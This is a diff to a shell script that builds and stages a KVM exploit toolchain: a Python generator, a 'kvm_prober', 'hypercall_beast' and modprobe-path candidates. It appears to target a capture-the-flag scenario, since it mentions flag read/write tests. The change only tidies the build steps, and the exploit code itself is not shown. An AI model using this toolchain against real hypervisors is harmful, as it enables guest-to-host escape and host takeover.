@@ -117,22 +117,19 @@ sleep 2
 ### ===Create kvm_prober===
 echo "[*] Installing exploit script"
 
-# Check if previous kvm_prober directory exists
-if ls -la /tmp/kvm_probe_build* &>/dev/null; then
-   echo "[!] Removing previous kvm_prober directory"
-   rm -r /tmp/kvm_probe_build*
-fi
+# Remove previous build dirs
+rm -r /tmp/kvm_probe_build* 2>/dev/null
 
-# Install kvm_prober
-echo "[*] Installing kvm prober"
+# Generate sources and build
 python3 kvm_dma_overwrite.py
+
+# Set PROBE_DIR
+PROBE_DIR=$(find /tmp -type d -name "kvm_probe_build*" | head -n1)
 
 # Check if kvm_prober was built
 if [ ! -f "$PROBE_DIR/kvm_prober" ]; then
     echo "[!] kvm_prober build failed. Attempting to use backup Makefile..."
-    # Copy backup Makefile (assumed to be in current directory) to $PROBE_DIR
     cp ./Makefile.backup "$PROBE_DIR/Makefile"
-    # Try building again
     (cd "$PROBE_DIR" && make)
     if [ -f "$PROBE_DIR/kvm_prober" ]; then
         echo "[+] kvm_prober built successfully with backup Makefile."
@@ -217,9 +214,6 @@ gcc -O2 -Wall -o hypercall_beast hypercall_beast.c
 
 echo "[✔] modprobe_candidates successfully created!"
 echo "[*] $MODPROBE_PA"
-
-echo "[*] getting kvm_prober all setup"
-python3 kvm_dma_overwrite.py
 
 sleep 2
 echo "[*] running read and write flag tests"
